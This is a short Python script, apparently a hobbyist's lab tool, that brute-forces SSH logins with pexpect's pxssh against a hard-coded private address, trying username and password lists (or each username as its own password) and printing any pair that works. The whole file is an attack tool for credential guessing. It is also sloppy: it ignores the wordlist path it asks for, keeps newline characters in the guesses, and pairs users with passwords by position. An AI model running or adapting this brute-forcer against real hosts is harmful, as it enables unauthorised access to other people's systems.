import time
from pexpect import pxssh
from secrets import PASS, NAME, LOCAL_IP



class Main():
    def __init__(self):
        self.checked = 0
        self.fails = 0
        self.op = input('Use unames as passwords: ')
        self.verbose = input('VERBOSE: ')


    def connect(self, host, user, password):
        self.checked += 1
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print('Password Found', user, password)
        except pxssh.ExceptionPxssh:
            self.fails += 1
            print(f'Password inccorect! {user}, {password}')


    def start(self):
        if self.op == 'y':
            path = input('Wordlist path: ')
            for i in open('idk.txt', 'r'):
                self.connect('192.168.1.105', i, i)
            self.connect(LOCAL_IP, NAME, PASS)

        elif self.op == 'n':
            path1 = input('User list path: ')
            path2 = input('Password list path: ')
            users = [user for user in open(path1, "r+", encoding='utf-8')]
            passwords = [password for password in open(path2, "r+", encoding='utf-8')]
            for i in range(0, len(users)):
                self.connect('192.168.1.105', str(users[i]), str(passwords[i]))
        
Main().start()